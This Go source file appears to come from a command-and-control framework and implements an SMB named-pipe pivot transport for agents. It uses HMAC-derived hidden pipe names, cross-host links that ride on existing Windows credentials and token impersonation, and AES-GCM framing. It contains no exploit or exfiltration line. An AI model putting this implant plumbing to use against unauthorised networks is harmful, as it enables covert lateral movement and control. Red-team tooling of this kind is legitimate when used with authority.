package transport

// smb_transport.go — SMB peer-to-peer transport.
//
// Mainstream C2 frameworks implement SMB P2P on Windows the same way Cobalt
// Strike's SMB beacon, Sliver's named-pipe pivot and Meterpreter's named-pipe
// binds do: a server exposes a named pipe and the OS SMB redirector carries the
// byte stream across hosts. We follow that model:
//
//   - The listener owns a named pipe \\.\pipe\<derived> and accepts one
//     connection per pipe instance (PIPE_UNLIMITED_INSTANCES).
//   - The dialer opens \\.\pipe\<derived> locally, or \\<host>\pipe\<derived>
//     for a remote peer; for the latter the Windows SMB client transports it
//     over the normal SMB stack (445/tcp) using the process logon session, so
//     existing NTLM/Kerberos credentials and token impersonation apply.
//   - The byte stream is framed with the project's AES-GCM stream wrapper
//     (the same scheme the mtls transport uses), so the peer link is
//     authenticated and encrypted regardless of whether SMB signs/encrypts
//     the underlying transport. The pipe name is not a trust boundary.
//
// The pipe name is derived from the shared secret (password) and salt plus the
// advertised P2P port. This keeps it non-guessable and per-agent even though
// every agent in a build shares the same config password, and it means the
// dialer learns the name from gossip metadata (P2PPort) without extra fields.
//
// Named pipes are a Windows concept; smb_pipe_other.go returns a descriptive
// error on other platforms so the mesh stack can fall back to kcp/mtls. That
// matches the mainstream tools, whose SMB P2P is Windows-only.

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const (
	smbTransportName = "smb"
	// smbDialTimeout bounds how long a dialer waits for a peer pipe to appear
	// (peer still starting up) or to become free (all instances busy).
	smbDialTimeout = 10 * time.Second
)

// SMBTransport implements MeshTransport over Windows SMB named pipes.
type SMBTransport struct{}

// Supported reports whether SMB named pipes are available on this platform.
func (t SMBTransport) Supported() bool { return t.SupportedOn(runtime.GOOS) }

// SupportedOn reports whether SMB named pipes can be used on the given GOOS.
// It is platform-parameterised (rather than reading runtime.GOOS) so the
// operator can validate a transport against a payload's *target* OS.
func (t SMBTransport) SupportedOn(goos string) bool { return goos == "windows" }

// Portless reports that SMB opens no network port: the configured relay port is
// only an input to the derived pipe name.
func (t SMBTransport) Portless() bool { return true }

// Dial opens a named pipe on the peer and wraps it in the AES-GCM frame cipher.
func (t SMBTransport) Dial(addr, password, salt string) (net.Conn, error) {
	host, port := parseSMBAddr(addr)
	conn, err := smbDialPipe(host, port, password, salt)
	if err != nil {
		return nil, err
	}
	return NewGCMConn(conn, password, salt)
}

// Listen creates a named-pipe listener and wraps every accepted stream in the
// AES-GCM frame cipher. The port argument only selects the derived pipe name;
// no TCP port is opened.
func (t SMBTransport) Listen(port, password, salt string) (net.Listener, error) {
	p, err := strconv.Atoi(strings.TrimSpace(port))
	if err != nil {
		p = 0
	}
	l, err := smbListenPipe(p, password, salt)
	if err != nil {
		return nil, err
	}
	return &gcmListener{Listener: l, Password: password, Salt: salt}, nil
}

// Accept blocks until a peer connects, unless ctx is cancelled first.
func (t SMBTransport) Accept(ctx context.Context, l net.Listener) (net.Conn, error) {
	return acceptWithContext(ctx, l)
}

func init() {
	RegisterTransport(
		smbTransportName,
		`Windows SMB named-pipe transport (AES-GCM), cross-host via \\host\pipe`,
		SMBTransport{},
	)
}

// smbPipeBase derives an opaque, per-agent pipe base name. It is deterministic
// for a given (password, salt, port) so the dialer can reconstruct it from the
// peer's advertised P2P port, yet it reveals nothing about the build.
func smbPipeBase(password, salt string, port int) string {
	mac := hmac.New(sha256.New, meshKey(password, salt))
	fmt.Fprintf(mac, "smb-pipe\x00%d", port)
	return "p" + hex.EncodeToString(mac.Sum(nil)[:16])
}

// parseSMBAddr splits an address of the form "host:port" (optionally a bare
// host or a bracketed IPv6 literal). A missing port yields 0, which still
// derives a stable pipe name if both ends omit it.
func parseSMBAddr(addr string) (host string, port int) {
	addr = strings.TrimSpace(addr)
	if h, p, err := net.SplitHostPort(addr); err == nil {
		port, _ = strconv.Atoi(p)
		return h, port
	}
	return strings.Trim(addr, "[]"), 0
}

// gcmListener wraps every accepted stream with the AES-GCM frame cipher.
type gcmListener struct {
	net.Listener
	Password string
	Salt     string
}

func (gl *gcmListener) Accept() (net.Conn, error) {
	conn, err := gl.Listener.Accept()
	if err != nil {
		return nil, err
	}
	return wrapGCMConn(conn, gl.Password, gl.Salt)
}

// wrapGCMConn upgrades a raw accepted connection to AES-GCM framing, closing
// the raw connection if the upgrade fails.
func wrapGCMConn(conn net.Conn, password, salt string) (net.Conn, error) {
	gcmConn, err := NewGCMConn(conn, password, salt)
	if err != nil {
		conn.Close()
		return nil, err
	}
	return gcmConn, nil
}

// acceptWithContext accepts from l unless ctx is cancelled first. The accept
// goroutine is released when l is closed, which callers must do on shutdown.
func acceptWithContext(ctx context.Context, l net.Listener) (net.Conn, error) {
	type acceptRes struct {
		c   net.Conn
		err error
	}
	ch := make(chan acceptRes, 1)
	go func() {
		c, e := l.Accept()
		ch <- acceptRes{c, e}
	}()
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case res := <-ch:
		return res.c, res.err
	}
}
